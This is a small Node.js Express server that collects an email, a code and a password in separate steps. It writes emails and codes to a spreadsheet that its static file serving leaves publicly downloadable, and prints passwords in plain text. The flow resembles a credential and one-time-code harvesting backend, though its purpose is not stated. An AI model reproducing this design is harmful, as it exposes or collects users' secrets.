const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const cors = require("cors");
const XLSX = require("xlsx");

const app = express();
const port = 3000;

app.use(cors());
app.use(express.static(__dirname));
app.use(bodyParser.json());

const filePath = path.join(__dirname, "data.xlsx");
let allData = [];

const logAndSave = (data) => {
  console.log("Received:", data);
  allData.push(data);
  const worksheet = XLSX.utils.json_to_sheet(allData);
  const workbook = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(workbook, worksheet, "Sheet1");
  XLSX.writeFile(workbook, filePath);
};

app.post("/step-email", (req, res) => {
  logAndSave({ email: req.body.email });
  res.sendStatus(200);
});

app.post("/step-code", (req, res) => {
  logAndSave({ code: req.body.code });
  res.sendStatus(200);
});

app.post("/step-password", (req, res) => {
    const password = req.body.password;
    console.log("Password received:", password);
    res.sendStatus(200);
});


app.post("/register", (req, res) => {
  const { email, code, password } = req.body;
  console.log("🟢 Final Registration Received:");
  console.log("Email:", email);
  console.log("Code:", code);
  console.log("Password:", password);
  res.json({ status: "User registration completed." });
});


app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
